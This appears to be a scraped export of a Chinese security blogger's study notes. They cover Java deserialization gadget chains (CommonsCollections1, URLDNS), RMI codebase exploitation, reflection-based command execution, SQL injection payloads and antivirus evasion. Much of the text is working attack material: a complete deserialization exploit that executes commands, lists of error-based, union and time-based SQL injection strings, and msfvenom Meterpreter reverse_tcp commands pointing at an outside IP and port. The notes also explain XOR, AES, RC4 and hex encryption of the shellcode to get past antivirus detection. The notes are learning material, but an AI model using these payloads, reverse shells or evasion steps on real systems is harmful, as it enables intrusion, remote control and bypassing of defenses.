String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tinnerMap.put(&quot;value&quot;, &quot;xxxx&quot;);\n\t\tMap outerMap &#x3D; TransformedMap.decorate(innerMap, null,\n\t\t\t\ttransformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\tObject obj &#x3D; construct.newInstance(Retention.class, outerMap);\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(obj);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\t\t\t\n\t&#125;\n&#125;\n\n\n\nLazyMap环境：\n小于jdk8u71\n在yso中没有使用TransformedMap而是使用LazyMap，LazyMap与TransformedMap的不同点在于，LazyMap是通过get方法执行put操作，在执行get方法输入一个不存在的key值时会默认调用put方法，这样就能执行回调。\n而在AnnotationInvocationHandler类的invoke方法中正好有使用到get方法。\nyso中利用java对象代理 java.reflect.Proxy 来劫持AnnotationInvocationHandler的某个对象\nMap proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\t\t&#123;Map.class&#125;, handler);  \n\n第一个参数使用默认，第二个参数是需要代理的对象集合，第三个参数是实现了InvocationHandler 接口的对象，里面有代理的逻辑。\nAnnotationInvocationHandler类就是一个InvocationHandler，所以对它进行代理，在readObject方法中只要调用了任意方法就会导致执行LazyMap的get方法。\nInvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\n Map proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new Class[] \t\n                                             &#123;Map.class&#125;, handler);  \n\n代理的对象是一个Map需要将其转化为AnnotationInvocationHandler，因为要执行的是AnnotationInvocationHandler的readObject方法。\nhandler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\tproxyMap);\n\n接下来就是正常的序列化和反序列化了\nyso中在transformer数组的最后还添加了一个 ConstantTransformer(1)，它的作用是隐藏程序运行爆出的进程启动信息。\n完整利用：package org.vulhub.sec;\nimport org.apache.commons.collections.Transformer;\nimport org.apache.commons.collections.functors.ChainedTransformer;\nimport org.apache.commons.collections.functors.ConstantTransformer;\nimport org.apache.commons.collections.functors.InvokerTransformer;\nimport org.apache.commons.collections.map.LazyMap;\nimport org.apache.commons.collections.map.TransformedMap;\n\nimport java.io.ByteArrayInputStream;\nimport java.io.ByteArrayOutputStream;\nimport java.io.ObjectInputStream;\nimport java.io.ObjectOutputStream;\nimport java.lang.annotation.Retention;\nimport java.lang.reflect.Constructor;\nimport java.lang.reflect.InvocationHandler;\nimport java.lang.reflect.Proxy;\nimport java.util.HashMap;\nimport java.util.Map;\npublic class CommonCollections1Lazy &#123;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\n\t\tTransformer[] transformers &#x3D; new Transformer[]&#123;\t\n\t\t\t\tnew ConstantTransformer(Runtime.class),\n\t\t\t\tnew InvokerTransformer(&quot;getMethod&quot;, new Class[] &#123; String.class,Class[].class&#125;, new Object[] &#123;&quot;getRuntime&quot;,new Class[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;invoke&quot;, new Class[] &#123; Object.class,Object[].class &#125;, new Object[] &#123; null, new Object[0] &#125;),\n\t\t\t\tnew InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;,\n\t\t\t\t\t\tnew String[]\n\t\t\t\t\t\t\t\t&#123;&quot;C:\\\\\\\\Windows\\\\\\\\SysWOW64\\\\\\\\calc.exe&quot;&#125;),\n                new ConstantTransformer(1),\n\t\t&#125;;\n\t\tTransformer transformerChain &#x3D; new ChainedTransformer(transformers);\n\t\tMap innerMap &#x3D; new HashMap();\n\t\t\n\t\tMap outerMap &#x3D; LazyMap.decorate(innerMap, transformerChain);\n\t\t\n\t\tClass clazz &#x3D; Class.forName(&quot;sun.reflect.annotation.AnnotationInvocationHandler&quot;);\n\t\tConstructor construct &#x3D; clazz.getDeclaredConstructor(Class.class, Map.class);\n\t\tconstruct.setAccessible(true);\n\t\t\n\t\tInvocationHandler handler &#x3D; (InvocationHandler)\n\t\t\t\tconstruct.newInstance(Retention.class, outerMap);\n\t\t&#x2F;&#x2F;进行proxy\n\t\tMap proxyMap &#x3D; (Map) Proxy.newProxyInstance(Map.class.getClassLoader(), new\n\t\t\t\tClass[] &#123;Map.class&#125;, handler);\n\t\t&#x2F;&#x2F;用AnnotationInvocationHandler对这个proxyMap进行包裹\n\t\thandler &#x3D; (InvocationHandler) construct.newInstance(Retention.class,\n\t\t\t\tproxyMap);\n\n\t\t\t\t\n\t\tByteArrayOutputStream barr &#x3D; new ByteArrayOutputStream();\n\t\tObjectOutputStream oos &#x3D; new ObjectOutputStream(barr);\n\t\t\n\t\toos.writeObject(handler);\n\t\toos.close();\n\t\t\n\t\tSystem.out.println(barr);\n\t\tObjectInputStream ois &#x3D; new ObjectInputStream(new ByteArrayInputStream(barr.toByteArray()));\n\t\t\n\t\tObject o &#x3D; (Object)ois.readObject();\n\t\t\n\t\t\n\t&#125;\n&#125;\n\n\n\n","slug":"Java反序列化2笔记","date":"2022-09-05T11:58:43.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"ef40a0cd7170df96b7fe2fe93ccaa11e","title":"Java反序列化1笔记","content":"参考资料：p牛 Java安全漫谈7 8  反序列化1 2\nhttps://t.zsxq.com/05QrVnMBy\nhttps://t.zsxq.com/053zvFeAu\nJava反序列化利用基础在Java 中，主要是通过\nwriteobject写入序列化数据到stream\n并将\n序列化输入的数据保存到 Annotation  中\n通过\nreadobject读取写入到stream的序列化数据将其反序列化执行\nURLDNS反序列化利用链（gadget） ysoserial的URLDNS类，通过getobject方法获取payload，getobject方法将会返回被序列化的对象，这个对象在这条链里是hashmap\n通过hashmap类的readobject方法触发反序列化\n在hashmap的readobject方法中会执行hash方法\nputVal(*hash*(key), key, value, false, false);\n\n这个hash方法直接使用的在hashmap中\nreturn (key &#x3D;&#x3D; null) ? 0 : (h &#x3D; key.hashCode()) ^ (h &gt;&gt;&gt; 16);\n\nhash方法又调用了hashcode方法，这次调用是通过key调用的\n这个key是yso实例化的一个url对象，所以查看url中的hashcode方法\nif (hashCode !&#x3D; -1)\n    return hashCode;\n\nhashCode &#x3D; handler.hashCode(this);\nreturn hashCode;\n\n序列化时设置了\nReflections.*setFieldValue*(u, &quot;hashCode&quot;, -1); &#x2F;&#x2F; During the put above, the URL&#39;s hashCode is calculated and cached. This resets that so the next time hashCode is called a DNS lookup will be triggered.\n\n这个url对象的hashcode初始值为-1，就会调用handler的hashcode方法\n这个handler是URLStreamHandler对象的某个子类对象  （这个不知道代码在哪里写了）可能是这个\nstatic Hashtable&lt;String,URLStreamHandler&gt; *handlers* &#x3D; new Hashtable&lt;&gt;();\n\nURLStreamHandler是抽象类，所以只能实例化继承的子类\n在hashtable中没有重载或是覆写那么调用的这个方法就是在URLStreamHandler这个类中存在的该方法\nInetAddress addr &#x3D; getHostAddress(u);\n\n调用了getHostAddress方法，这个方法\nreturn u.getHostAddress();\n\n又调用了u也就是key的getHostAddress方法，在url类中\nhostAddress &#x3D; InetAddress.*getByName*(host);\n\n这个getHostAddress方法又调用InetAddress的getByName方法\n这个getByName方法的实现，是调用了getByAllName方法，作用是根据主机名，获取其IP地址，也就是发出一次DNS请求\n在yso中为了防止发出生成payload的时候也发出url请求和DNS查询，就重写了URLStreamHandler中的SilentURLStreamHandler类。\n整个流程：URLDNS—-&gt;HashMap.readobject()\nHashMap.readobject()—-&gt;HashMap.hash()\nHashMap.hash()—-&gt;URL.hashcode()\nURL.hashcode()—-&gt;URLStreamHandler.hashcode()\nURLStreamHandler.hashcode()—-&gt;URLStreamHandler.getHostAddress()\nURLStreamHandler.getHostAddress()—-&gt;URL.getHostAddress()\nURL.getHostAddress()—-&gt;InetAddress.getByName()\n上面的URLStreamHandler.getHostAddress()是一个重载方法，可以和URL.getHostAddress()一起当作是一个函数的调用\n星球问题解答：会上树的猪：\np师傅，关于这个链有一个小问题想请教。就是在对URL进行反序列化的时候不会调用构造方法了，那反序列化之后的handler属性是在哪一步被赋值的，我debug了一下URL类的readObject方法，只看到有一个调用了getURLStreamHandler()方法，是和handler属性有关的。就是这个handler的生成不是很明白，望师傅答疑\ncc：\n最近也在学Java反序列化，这个问题在分析的时候也困扰着我。后面经过分析发现。在URL类中还有一个方法是readResolve。在readResolve方法中会调用fabricateNewURL方法中new URL实例返回。在new URL(urlString);中会对handler进行赋值：this.handler = handler。并且在反序列化的时候会自动调用readResolve方法。注：可下断点在invokeReadResolve方法上，内部通过反射调用了readResolve。 readResolve作用，其方法的返回值为一个Object对象，该方法返回的对象将会代替反序列化的结果，直接将其作为反序列化的结果返回给上层调用ObjectInputStream对象readObject方法的结果。 分析过后感觉这个readResolve也是一个可利用的点，与readObject一样会自动调用。应该也可以通过readResolve作为入口的链。不过目前没有看到有链利用到了这一个，所以也不知道自己分析的对不对，求大家解答。\n","slug":"Java反序列化1笔记","date":"2022-09-05T11:53:13.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"fb61931117f747252b543f33903e3e6d","title":"Java RMI笔记","content":"参考资料：廖雪峰老师 Java教程 RMI\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1323711850348577\np牛  Java安全漫谈456 RMI \nhttps://t.zsxq.com/052Nj62Jq\nhttps://t.zsxq.com/057qNvJ6I\nhttps://t.zsxq.com/05j2fM7iE\nseebug文章\nhttps://paper.seebug.org/1091/\nJava各种协议分析\nhttps://i.blackhat.com/eu-19/Wednesday/eu-19-An-Far-Sides-Of-Java-Remote-Protocols.pdf\n原理：客户端远程调用服务端代码，在服务端执行改代码，并返回结果给客户端\n整个过程由RMI底层负责实现序列化和反序列化\n要实现RMI，服务器和客户端必须共享同一个接口。\nJava的RMI规定此接口必须派生自java.rmi.Remote，并在每个方法声明抛出RemoteException。\nJava的RMI严重依赖序列化和反序列化，而这种情况下可能会造成严重的安全漏洞，因为Java的序列化和反序列化不但涉及到数据，还涉及到二进制的字节码，即使使用白名单机制也很难保证100%排除恶意构造的字节码。因此，使用RMI时，双方必须是内网互相信任的机器，不要把1099端口暴露在公网上作为对外服务。\n此外，Java的RMI调用机制决定了双方必须是Java程序，其他语言很难调用Java的RMI。如果要使用不同语言进行RPC调用，可以选择更通用的协议，例如gRPC。\nRMI Registry    提供注册，并将其绑定到RMI Server的对象上\nRMI Server    提供远程服务，里面有各种方法，有返回结果\nRMI Client     连接Registry，之后调用Server上的方法，获取返回结果\n简单RMI：服务端：package com.rmitest;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.registry.Registry;\nimport java.rmi.server.UnicastRemoteObject;\n\n&#x2F;&#x2F;RMI服务创建后，将在后台开启监听线程，代码中并没有停止线程，\n&#x2F;&#x2F;所以需要使用资源管理器，搜索线程pid去停止该线程\npublic class RMIServer &#123;\n\t&#x2F;&#x2F;RMIServer端分为三个部分\n\t&#x2F;&#x2F;⼀个继承了 java.rmi.Remote 的接⼝，其中定义我们要远程调⽤的函数，⽐如这⾥的 hello()\n\tpublic interface IRemoteHelloWorld extends Remote &#123;\n\t\t public String hello() throws RemoteException;\n\t&#125;\n\t\t&#x2F;&#x2F;⼀个实现了此接⼝的类\n\tpublic class RemoteHelloWorld extends UnicastRemoteObject implements\n\t\tIRemoteHelloWorld &#123;\n\t\t protected RemoteHelloWorld() throws RemoteException &#123;\n\t\t\t super();\n\t\t \t&#125;\n\t\t \n\t\t public String hello() throws RemoteException &#123;\n\t\t\t System.out.println(&quot;call from&quot;);\n\t\t\t return &quot;Hello world&quot;;\n\t\t \t&#125;\n\t&#125;\n\t\t \n\tprivate void start() throws Exception &#123;\n\t\t&#x2F;&#x2F;用来创建Registry，\n\t\t&#x2F;&#x2F;并将上面的类实例化后绑定到⼀个地址。\n\t\t &#x2F;&#x2F;这就是我们所谓的Server了。s\n\t\tRemoteHelloWorld h &#x3D; new RemoteHelloWorld();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;rmi:&#x2F;&#x2F;127.0.0.1:1099&#x2F;Hello&quot;, h);\n\t&#125;\n\t\n\t&#x2F;&#x2F;实例化RMIServer类，并执行start方法\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t\t new RMIServer().start();\n\t&#125;\n\t\n&#125;\n\n客户端：package com.rmitest;\n\nimport com.rmitest.RMIServer;\nimport java.rmi.Naming;\nimport java.rmi.NotBoundException;\nimport java.rmi.RemoteException;\n\npublic class RMIClient &#123;\n\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\t RMIServer.IRemoteHelloWorld hello &#x3D; \n\t\t\t\t (RMIServer.IRemoteHelloWorld)Naming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;Hello&quot;);\n\t\t String ret &#x3D; hello.hello();\n\t\t System.out.println(ret);\n\t&#125;\n\n\n&#125;\n\n\n\n利用： 1. 如果我们能访问RMI Registry服务，如何对其攻击？\n 2. 如果我们控制了目标RMI客户端中 Naming.lookup 的第一个参数（也就是RMI Registry的地 址），能不能进行攻击？  \n首先测试RMI Registry 的远程调用，发现RMI Registry  只允许本地调用rebind、bind、unbind方法，远程调用允许list、lookup方法\nlist方法能获取服务端所有绑定的对象列表\nlookup则是能获取服务端某个对象\nlookup让我们能够调用服务端上存在的危险方法\nhttps://github.com/NickstaDB/BaRMIe  该项目可以测试RMI上存在的危险方法\nApplet codebase任意代码执行要求：\n 安装并配置了SecurityManager  \nJava版本低于7u21、6u45，或者设置了 java.rmi.server.useCodebaseOnly=false  ，这个之前版本默认java.rmi.server.useCodebaseOnly=false  \n\n复现：按照安全漫谈5，写好3个服务类，之后运行服务端\nRemoteRMIServerpackage com.rmitest.CodeBase;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.rmi.registry.LocateRegistry;\nimport java.rmi.server.UnicastRemoteObject;\nimport java.util.List;\n\npublic class RemoteRMIServer &#123;\n\tprivate void start() throws Exception &#123;\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tCalc h &#x3D; new Calc();\n\t\tLocateRegistry.createRegistry(1099);\n\t\tNaming.rebind(&quot;refObj&quot;, h);\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\tnew RemoteRMIServer().start();\n\t&#125;\n&#125;\n\n\n\nICalcpackage com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\n\nimport java.rmi.RemoteException;\nimport java.util.List;\npublic interface ICalc extends Remote &#123;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException;\n&#125;\n\n\nCalcpackage com.rmitest.CodeBase;\n\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\nimport java.rmi.server.UnicastRemoteObject;\n\npublic class Calc extends UnicastRemoteObject implements ICalc &#123;\n\tpublic Calc() throws RemoteException &#123;&#125;\n\tpublic Integer sum(List&lt;Integer&gt; params) throws RemoteException &#123;\n\t\tInteger sum &#x3D; 0;\n\t\tfor (Integer param : params) &#123;\n\t\t\tsum +&#x3D; param;\n\t\t&#125;\n\t\treturn sum;\n\t&#125;\n&#125;\n\n\n同时该文件夹需要有client.policy文件\ngrant &#123;\n\tpermission java.security.AllPermission;\n&#125;;\n\njavac *.java\n带着包名编译，在java文件目录无法执行程序，需要切换到src目录执行命令\n同时需要将Client.policy放到src目录下\njava -Djava.rmi.server.hostname=192.168.0.107 -Djava.rmi.server.useCodebaseOnly=false -Djava.security.policy=client.policy com.rmitest.CodeBase.RemoteRMIServer\n这时执行程序需要用完整程序名\n在另一个文件夹编写好client类，编译运行\nRMIClientpackage com.rmitest.CodeBaseClient;\n\nimport java.rmi.Naming;\nimport java.rmi.Remote;\nimport java.rmi.RemoteException;\nimport java.util.List;\n\nimport com.rmitest.CodeBase.ICalc;\n\nimport java.util.ArrayList;\nimport java.io.Serializable;\n\npublic class RMIClient implements Serializable &#123;\t\n\t\n\tpublic class Payload extends ArrayList&lt;Integer&gt; &#123;&#125;\n\tpublic void lookup() throws Exception &#123;\n\t\t&#x2F;&#x2F;需要设置，不然报错\n\t\tif (System.getSecurityManager() &#x3D;&#x3D; null) &#123;\n\t\t\t\tSystem.out.println(&quot;setup SecurityManager&quot;);\n\t\t\t\tSystem.setSecurityManager(new SecurityManager());\n\t\t&#125;\n\t\tICalc r &#x3D; (ICalc)\n\t\t\t\tNaming.lookup(&quot;rmi:&#x2F;&#x2F;192.168.0.107:1099&#x2F;refObj&quot;);\n\t\tList&lt;Integer&gt; li &#x3D; new Payload();\n\t\tli.add(3);\n\t\tli.add(4);\n\t\tSystem.out.println(r.sum(li));\n\t&#125;\n\tpublic static void main(String[] args) throws Exception &#123;\n\t\tnew RMIClient().lookup();\n\t&#125;\n&#125;\n\njavac RMIClient.java -classpath ../../../\n修改命令\njava  -Djava.rmi.server.useCodebaseOnly=false  -Djava.rmi.server.codebase=http://ip:port/RMIClient$Payload.class -Djava.security.policy=client.policy com.rmitest.CodeBaseClient.RMIClient\n这个codebase可以修改为自己服务器的IP:port\n当客户端运行时，服务端在classpath找不到/RMIClient$Payload.class 时，会尝试去远程加载codebase路径下的 /RMIClient$Payload.class\n这时只需要将恶意类放到服务器的 /RMIClient$Payload.class  就能执行恶意代码  \n需要注意的是，这个客户端不能放到服务端一起，需要在另一个地方运行，连接后才能让服务端找不到 /RMIClient$Payload.class      但是就是这样复现就有问题了\n问题：\n复现时执行服务端和客户端代码都报错：错误: 找不到或无法加载主类\n尝试用客户端连接，发现报错：no security manager: RMI class loader disabled\n再次尝试连接报错：Exception in thread “main” java.security.AccessControlException: access denied (“java.net.SocketPermission” “192.168.0.107:1099” “connect,resolve”)\n解决前面的问题后发现只能本地访问**/RMIClient$Payload.class,就算删除本地/RMIClient$Payload.class文件，设置了codebase远程连接他也不会远程访问获取，而是直接报错找不到该文件**\n\n解决：\n配置好classpath，尝试去除包名编译，可以运行服务端\n这个星球有人讲了，在客服端也需要设置SecurityManager\n这个解决方式是在客户端执行命令的时候也要在policy文件\n暂时没有解决\n\n","slug":"Java-RMI笔记","date":"2022-09-05T11:38:51.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"a87dfbaadf5431aac0df9631c18a8ee5","title":"Java反射笔记","content":"参考资料：\n廖雪峰老师Java教程   反射\nhttps://www.liaoxuefeng.com/wiki/1252599548343744/1255945147512512\np牛Java安全漫谈  反射篇1，2，3\nhttps://t.zsxq.com/056qbMzVV\nhttps://t.zsxq.com/05BiAyF6Y\nhttps://t.zsxq.com/05yrbEQVb\n常见的两种可以通过反射执行命令的类\njava.lang.Runtime\njava.lang.ProcessBuilder\n\n正常反射调用public方法   无参构造方法通过Method调用，能获取所有public方法，和父类中的方法\nimport java.lang.reflect.Method;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);\n\nMethod execMethod &#x3D; clazz.getMethod(&quot;exec&quot;, String.class);\n\nMethod getRuntimeMethod &#x3D; clazz.getMethod(&quot;getRuntime&quot;);\n\nObject runtime &#x3D; getRuntimeMethod.invoke(clazz);\n\nexecMethod.invoke(runtime, &quot;calc.exe&quot;);\n\n按照反射原理，正常创建类实例，之后通过类实例获取类方法，再通过获取到的类方法执行命令，通过invoke()进行执行。\n反射其实在编译时，就是正常的类的实例化和正常的方法调用\n通过反射调用ProcessBuilder执行命令    有参构造方法使用public ProcessBuilder(List command)这里使用Constructor进行反射调用，Constructor接收的参数为构造方法，通过Constructor可以实例化带参数的构造方法的类\nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n   \t\t&#x2F;&#x2F;强制转换类型调用\n\n    \t((ProcessBuilder)clazz.getConstructor(List.class).newInstance(\n\n    \t\t\tArrays.asList(&quot;calc.exe&quot;))).start();\n\n    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(List.class).newInstance(\n\n   \t\t\tArrays.asList(&quot;calc.exe&quot;)));\n\npublic ProcessBuilder(String… command)这里调用该类中另一种构造方法进行类实例\n该构造方法采用可变长参数（varargs）  \nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\nClass clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n​    \t((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(\n\n​    \t\t\tnew String[][]&#123;&#123;&quot;cmd&quot;,&quot;calc.exe&quot;&#125;&#125;)).start();\n\n​    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(\n\n​    \tnew String[][] &#123;&#123;&quot;calc.exe&quot;&#125;&#125;));\n\n​    \t&#x2F;&#x2F;球友写的，完全反射，但是一样的问题\n\n​    \t&#x2F;&#x2F;Class clazz &#x3D; Class.forName(&quot;java.lang.ProcessBuilder&quot;);\n\n​    \t&#x2F;&#x2F;Constructor constructor &#x3D; clazz.getConstructor(String[].class);\n\n​    \t&#x2F;&#x2F;Object o &#x3D; constructor.newInstance(new String[][]&#123;&#123;&quot;calc.exe&quot;&#125;&#125;);\n\n​    \t&#x2F;&#x2F;clazz.getMethod(&quot;start&quot;).invoke(o);\n\n\n\n其中复现执行命令，发现 java.lang.ProcessBuilder 在进行\n public ProcessBuilder(String… command）   有错误，无法复现\n构造函数调用时，会爆出 \nException in thread “main” java.lang.IllegalArgumentException: argument type mismatch\n解决方法参考文章：https://blog.csdn.net/qq_21383435/article/details/108277906\n文章参考的是：https://www.cnblogs.com/huqingchen/p/5979936.html\n文中提到反射调用可变参数方法是，必须要保证输入参数的数组长度为1\n原文：//可变参数必须这样封装，因为java反射内部实现做了参数个数为1的判断，如果参数长度不为1，则会抛出异常\n所以要按照下面这么写\nString[] a &#x3D; &#123;&quot;calc.exe&quot;&#125;;\n\n​    \tObject[] b &#x3D; &#123;a&#125;;\n\n​    \tclazz.getMethod(&quot;start&quot;).invoke(clazz.getConstructor(String[].class).newInstance(\n\n​    \t b));\n\n\n\n使用getDeclaredConstructor()反射调用私有的方法 getDeclaredMethod 系列方法获取的是当前类中“声明”的方法，是实在写在这个类里的，包括私有的方法，但从父类里继承来的就不包含了     \nimport java.lang.reflect.Constructor;\n\nimport java.lang.reflect.Method;\n\nimport java.util.Arrays;\n\nimport java.util.List;\n\n​    \tClass clazz &#x3D; Class.forName(&quot;java.lang.Runtime&quot;);\n\n​    \tConstructor m &#x3D; clazz.getDeclaredConstructor();\n\n​    \tm.setAccessible(true);\n\n​    \tclazz.getMethod(&quot;exec&quot;, String.class).invoke(m.newInstance(), &quot;calc.exe&quot;);\n\n这里又有问题，虽然设置了setAccessible为true，但是运行的时候还是报错，私有方法不可被调用\n在廖雪峰老师的教程中提到过虽然设置了setAccessible为true，但可能还是会有问题，就是不能访问\n原文：此外，setAccessible(true)可能会失败。如果JVM运行期存在SecurityManager，那么它会根据规则进行检查，有可能阻止setAccessible(true)。例如，某个SecurityManager可能不允许对java和javax开头的package的类调用setAccessible(true)，这样可以保证JVM核心库的安全。\n解决方法查看本机java版本是1.8- 3.2.1猜测可能是java版本过高\n去采用虚拟机里的1.8-2.x.x编译执行，成功执行命令\n测试本机命令行执行时发现，提示找不到主类\n再去除包名后重新编译，发现主机还是不能执行\n测试得出结论就是环境问题，同一个class文件，虚拟机能执行，主机不能执行\n","slug":"Java反射笔记","date":"2022-09-05T11:36:43.000Z","categories_index":"Java安全","tags_index":"Java","author_index":"Longw"},{"id":"170904693726acf3c72f07df195a2a4e","title":"免杀入门-小迪笔记","content":"杀软检测方式在shellcode代码中包含了服务器的IP及监听端口，直接使用shellcode上线会被杀软检测到\n免杀常见初始思路加载方式修改各种shellcode加载方式达到免杀效果\n如常见加载器项目：Callback_Shellcode_Injection\nhttps://github.com/ChaitanyaHaritash/Callback_Shellcode_Injection\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\n但是使用过多已经完全被pass\n替换shellcode为自己的shellcode\n编码混淆加密算法利用常见的编码方式，如：Xor Aes Hex Rc4 Rsa等\n将shellcode编码，再到源文件加载前进行解码\nxor和aes加密metasploit的x86初始类型的shellcode使用该项目：https://github.com/Arno0x/ShellcodeWrapper\n生成raw类型shellcode文件\nmsfvenom -a x86 -p windows/meterpreter/reverse_tcp LHOST=175.178.41.176 LPORT=6666 -f raw &gt; shellcode.raw\n脚本使用方式，本地安装requestments有问题\n加密库安装有问题，需要安装c++14.0 用vs studio安装\n使用python39 报错语法有问题，切换成py2可以加密成功\n工具下载最新的，防止bug\npython2 shellcode_encoder.py -cpp -cs -py shellcode.raw key xor\npython2 shellcode_encoder.py -cpp -cs -py shellcode.raw xiaodi xor\n-表示输出的文件类型，直接可编译，以上输出cpp，cs，py三种类型，cs是c#文件\nkey表示加密密钥\nxor表示加密方式\n\nencryptedShellcodeWrapper.cpp- 目前仅支持XOR 加密\nencryptedShellcodeWrapper.cs- 支持 XOR 和 AES 加密\nencryptedShellcodeWrapper.py- 支持 XOR 和 AES 加密\n\n生成的cpp文件打开后显示头文件错误，直接注释那一行\n之后将cpp文件生成exe\ncs编译  **C:\\Windows\\Microsoft.NET\\Framework\\v4.0.30319&gt;**csc /out:D:\\BaiduNetdiskDownload\\test\\test.exe D:\\BaiduNetdiskDownload\\test\\encryptedShellcodeWrapper_xor.cs\nmsf开启监听，测试脚本是否能上线\nexe执行报错，执行发现缺少dll文件，应该是x86的原因，测试一下其他的\n项目写的有问题，不用测试了，md，生成的文件编译后执行都有问题\n使用python3生成，但是python3生成时语法报错，真是个垃圾项目\n还有小迪自己编写的加密代码xor.py\npython xor.py -s shellcode.bin -d payload.c -n 10 -r out.bin\nhex加密使用shellcodelloader.exe生成exe文件\n生成payload，将生成的payload去掉   “  ,可能不能存在换行\n下载下来，使用工具生成exe，运行报错\nmsfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\nhttps://gchq.github.io/CyberChef/\nhttps://github.com/ByPassAVTeam/ShellcodeLoader\nLoaderMaker.exe download.dat(hex数据) xiaodi.exe(生成文件名)\nRc4加密msfvenom -p windows/meterpreter/reverse_tcp lhost=175.178.41.176 lport=6666 -f c\nhttps://blog.csdn.net/weixin_45590789/article/details/105536623\n使用方法，将rc4.cpp中的shellcode替换成msf生成的shellcode\n用vs调试，会生成加密后的shellcode，再将msf生成的shellcode替换为加密shellcode\n之后生成exe，可以将代码里的打印去掉，打印会导致弹窗打印\n前面也可以加上隐藏窗口代码\n","slug":"免杀入门-小迪笔记","date":"2022-09-05T11:23:50.000Z","categories_index":"python","tags_index":"免杀","author_index":"Longw"},{"id":"96816457e24e5ee2d74dc29d18ce444d","title":"SQL注入2","content":"\n\n补补基础，理解注入，记下学习笔记\nSQL注入数字型无需闭合单引号\n字符型闭合语句进行注入\n注入测试流程判断注入点注入类型获取信息函数user() database() version()  @@hostname   @@datadir  @@version_compile_os\nschema() connection_id() system_user()\tsession_user()\tcurrent_user() current_user\nsuser_name() user_name() db_name() is_member(&#39;db_owner&#39;) #判断数据库角色 \nconvert(int,&#39;5&#39;) #类型转换 stuff Getdata \n\n有回显\n报错注入：\n?id&#x3D;1 and updatexml(2,concat(0x7e,database(),0x7e),1)\n\n?id&#x3D;1 and extractvalue(1,concat(0x7e,database(),0x7e))\n\n?id&#x3D; 0&#39; union select 1,2,3 from (select count(*),concat((select concat(version(),0x3a,0x3a,database(),0x3a,0x3a,user(),0x3a) limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a --+   #获取数据库\n\n?id&#x3D;1&#39; and exp(~(select * from (select user())a))   #必须按照这个模式来，mysql是大于709\n\n利用报错注入获取信息时，信息条数最好限定，limit 0,1\nunion注入：\norder by判断字段数\nuinon select 1,2,3...     #找回显点\nunion select 1,user(),3...   #利用回显点\n\nunion注入，需要前面的语句错误，前后字段相同，默认去掉重复，union all不去除重复\n\n无回显\n布尔盲注\n利用true和false判断\nand (left(database(),1)&#x3D;&#39;s&#39;)   #判断数据库名的第一个字符\n\nand (ascii(substr(database(),1,1))&#x3D;97)  #用ascii判断\n\nand (length(database())&#x3D;5)   #利用length判断\n\n一般来说使用&gt;  &lt; 来判断范围，之后再判断具体数据\n延时注入\nselect benchark(1000,select * from user)   #mysql&lt;5.0,执行1000查询语句，尤其注意可能会导致数据库崩溃\n\nand sleep(5)   #直接测试能否执行\n\nand if(length(database())&gt;4,sleep(5),0)   #database&gt;4,则睡眠五秒\n\nand if(substring(user(),1,4)&#x3D;&#39;root&#39;,sleep(5),1)  #判断当前用户\n   \nand if(MID(version(),1,1)like 5,sleep(5),1)   